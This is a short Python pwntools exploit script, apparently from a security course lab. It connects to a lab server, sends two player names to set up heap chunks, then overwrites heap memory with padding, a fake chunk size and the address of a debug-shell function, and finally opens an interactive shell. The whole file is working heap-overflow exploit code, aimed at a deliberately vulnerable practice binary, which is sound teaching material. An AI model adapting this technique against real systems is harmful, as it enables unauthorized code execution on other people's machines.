''' Script Module Importing '''
from pwn import *

''' Constant Initializing '''
DBG_SHELL_ADDR = p64(0x4013ef)      # Address to Debug_Shell
HEAP_FILL = b"A"*72 + p64(0x31) 

def send_player_name(p, name):
    p.readuntil(b"finish):")        # Remove Program Output
    p.sendline(name)                # Send Player Name to malloc Heap

def overwrite_heap(p, payload):
    p.readuntil(b"use?:")           # Remove Program Output

    p.sendline(payload)             # Send Payload
    

if __name__ == "__main__":

    ''' Establish Connection '''
    p = remote("csc748.hostbin.org", 7081)  # Test Script Against Server
    #p = process("./8-1_lab.bin")           # Test Script Locally
    #p = gdb.debug("./8-1_lab.bin")         # Debug with GDB

    ''' Allocate Player Names '''
    print("[*] Sending Player Names")
    send_player_name(p, b"A" * 64)  # Player Name 1, malloc heap size of 0x50
    send_player_name(p, b"B" * 32)  # Player Name 2, malloc heap size of 0x30
    send_player_name(p, b"done")    # Send "done" to continue to do_archery();
    

    print("[*] Sending Payload")
    payload = HEAP_FILL + DBG_SHELL_ADDR
    overwrite_heap(p, payload)
    
    ''' Exploit Server '''
    p.interactive()                 # Start Interactive Session
    
